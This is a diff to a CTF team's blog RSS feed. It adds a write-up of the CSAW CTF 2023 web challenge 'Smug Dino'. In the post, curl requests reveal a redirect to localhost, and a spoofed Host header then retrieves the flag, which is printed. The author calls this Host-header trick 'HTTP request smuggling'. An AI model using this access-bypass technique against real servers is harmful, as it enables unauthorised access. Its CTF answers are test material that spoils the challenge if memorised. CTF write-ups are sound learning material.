@@ -4,10 +4,132 @@
         <link>https://m53-ctf.github.io/posts/</link>
         <description>Recent content in Posts on M53</description>
         <generator>Hugo -- gohugo.io</generator>
-        <language>en-us</language>
+        <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 29 Jun 2023 19:13:16 +0800</lastBuildDate>
+        <lastBuildDate>Mon, 18 Sep 2023 21:12:11 +0800</lastBuildDate>
         <atom:link href="https://m53-ctf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>[Csawctf2023] Smug Dino</title>
+            <link>https://m53-ctf.github.io/posts/csawctf2023-smug-dino/</link>
+            <pubDate>Mon, 18 Sep 2023 21:12:11 +0800</pubDate>
+            
+            <guid>https://m53-ctf.github.io/posts/csawctf2023-smug-dino/</guid>
+            <description>This challenge was first solved by one of our member Shen. I only managed to solved after looking into the brief writeup provided by him. After understanding this challenge, I decided to solve this challenge with just curl command.
+There is only a link given for this challenge. Since it is a web challenge, I started out by playing around with the web application.
+curl -v http://web.csaw.io:3009/ * processing: http://web.csaw.io:3009/ * Trying 44.</description>
+            <content type="html"><![CDATA[<p>This challenge was first solved by one of our member <strong>Shen</strong>. I only managed to solved after looking into the brief writeup provided by him. After understanding this challenge, I decided to solve this challenge with just <code>curl</code> command.</p>
+<p>There is only a link given for this challenge. Since it is a web challenge, I started out by playing around with the web application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v http://web.csaw.io:3009/    
+</span></span><span style="display:flex;"><span>* processing: http://web.csaw.io:3009/
+</span></span><span style="display:flex;"><span>*   Trying 44.218.164.132:3009...
+</span></span><span style="display:flex;"><span>* Connected to web.csaw.io <span style="color:#f92672">(</span>44.218.164.132<span style="color:#f92672">)</span> port <span style="color:#ae81ff">3009</span>
+</span></span><span style="display:flex;"><span>&gt; GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: web.csaw.io:3009
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.2.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>&lt; Server: nginx/1.17.6
+</span></span><span style="display:flex;"><span>&lt; Date: Sun, <span style="color:#ae81ff">17</span> Sep <span style="color:#ae81ff">2023</span> 13:44:31 GMT
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">1952</span>
+</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
+</span></span><span style="display:flex;"><span>&lt; X-Powered-By: Express
+</span></span><span style="display:flex;"><span>&lt; ETag: W/<span style="color:#e6db74">&#34;7a0-qKx6Ou+8z9np0jE0RYCSKOhMytk&#34;</span>
+</span></span><span style="display:flex;"><span>&lt; Set-Cookie: connect.sid<span style="color:#f92672">=</span>s%3ADoXqd65AqDw7qnAuvYjr9ax9Yazp2PB7.BomOa3aonqfdU8lisF0Wwy3DLiJlNT2oPoc74zRquGQ; Path<span style="color:#f92672">=</span>/; HttpOnly
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>    &lt;title&gt;All about dinos :<span style="color:#f92672">)</span> &lt;/title&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css&#34;</span> integrity<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO&#34;</span> crossorigin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/styles.css&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=Merriweather:400,700&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>    &lt;nav class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar navbar-dark bg-dark navbar-static-top navbar-expand-md&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;button type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-toggler collapsed&#34;</span> data-toggle<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse&#34;</span> data-target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#bs-example-navbar-collapse-1&#34;</span> aria-expanded<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span>&gt; &lt;span class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sr-only&#34;</span>&gt;Toggle navigation&lt;/span&gt;
+</span></span><span style="display:flex;"><span>            &lt;/button&gt; &lt;a class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-brand&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Smug Dino&lt;/a&gt;
+</span></span><span style="display:flex;"><span>            &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bs-example-navbar-collapse-1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;ul class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav navbar-nav mr-auto&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;li class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active nav-item&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link&#34;</span>&gt;Home&lt;/a&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/li&gt;
+</span></span><span style="display:flex;"><span>                    &lt;li class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/hint&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link&#34;</span>&gt;Hint&lt;/a&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/li&gt;
+</span></span><span style="display:flex;"><span>                    &lt;li class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/flag&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link&#34;</span>&gt;Flag?&lt;/a&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/li&gt;
+</span></span><span style="display:flex;"><span>                &lt;/ul&gt;
+</span></span><span style="display:flex;"><span>            &lt;/div&gt;
+</span></span><span style="display:flex;"><span>        &lt;/div&gt;
+</span></span><span style="display:flex;"><span>    &lt;/nav&gt;
+</span></span><span style="display:flex;"><span>    &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jumbotron&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;h1&gt;What<span style="color:#e6db74">&#39;s your favorite dinosuar?&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h5&gt;Ancient artifacts can teach us a lot -- just don&#39;</span>t have them in your code!&lt;/h5&gt;
+</span></span><span style="display:flex;"><span>            &lt;div style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;max-height:450px; max-width:450px; overflow: hidden&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://upload.wikimedia.org/wikipedia/commons/4/46/Lambeosaurus_magnicristatus_DB.jpg&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>           &lt;/div&gt;
+</span></span><span style="display:flex;"><span>            &lt;br&gt;
+</span></span><span style="display:flex;"><span>        &lt;/div&gt;
+</span></span><span style="display:flex;"><span>    &lt;/div&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host web.csaw.io left intact</span>
+</span></span></code></pre></div><p>Based on the result, I noticed that there is a <code>href=https://m53-ctf.github.io/flag</code>. Since the web application is referring to flag page, I decided to look into it and hope that it is not a rabbit hole.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> curl -v http://web.csaw.io:3009/flag
+</span></span><span style="display:flex;"><span>* processing: http://web.csaw.io:3009/flag
+</span></span><span style="display:flex;"><span>*   Trying 44.218.164.132:3009...
+</span></span><span style="display:flex;"><span>* Connected to web.csaw.io <span style="color:#f92672">(</span>44.218.164.132<span style="color:#f92672">)</span> port <span style="color:#ae81ff">3009</span>
+</span></span><span style="display:flex;"><span>&gt; GET /flag HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: web.csaw.io:3009
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.2.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> Moved Temporarily
+</span></span><span style="display:flex;"><span>&lt; Server: nginx/1.17.6
+</span></span><span style="display:flex;"><span>&lt; Date: Mon, <span style="color:#ae81ff">18</span> Sep <span style="color:#ae81ff">2023</span> 13:36:04 GMT
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">145</span>
+</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
+</span></span><span style="display:flex;"><span>&lt; Location: http://localhost:3009/flag.txt
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>&lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt;
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;&lt;center&gt;nginx/1.17.6&lt;/center&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host web.csaw.io left intact</span>
+</span></span></code></pre></div><p>After looking into the flag page, I noticed that the status code is 302 which means that the flag page has been moved to another places. After investigating the header, I found something interesting which is <code>Location: http://localhost:3009/flag.txt</code>. Since the status code is 302 and the location is referring to localhost, I could just perform HTTP request smuggling by providing a custom header that mentioned that it is localhost.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v http://web.csaw.io:3009/flag.txt -H <span style="color:#e6db74">&#39;Host:localhost:3009&#39;</span>
+</span></span><span style="display:flex;"><span>* processing: http://web.csaw.io:3009/flag.txt
+</span></span><span style="display:flex;"><span>*   Trying 44.218.164.132:3009...
+</span></span><span style="display:flex;"><span>* Connected to web.csaw.io <span style="color:#f92672">(</span>44.218.164.132<span style="color:#f92672">)</span> port <span style="color:#ae81ff">3009</span>
+</span></span><span style="display:flex;"><span>&gt; GET /flag.txt HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host:localhost:3009
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.2.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>&lt; Server: nginx/1.17.6
+</span></span><span style="display:flex;"><span>&lt; Date: Mon, <span style="color:#ae81ff">18</span> Sep <span style="color:#ae81ff">2023</span> 13:40:17 GMT
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/plain
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host web.csaw.io left intact</span>
+</span></span><span style="display:flex;"><span>csawctf<span style="color:#f92672">{</span>d0nt_smuggl3_Fla6s_!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="flag">Flag</h3>
+<pre tabindex="0"><code>csawctf{d0nt_smuggl3_Fla6s_!}
+</code></pre>]]></content>
+        </item>
         
         <item>
             <title>[BSIDESTLVCTF] Tsebrakhn</title>
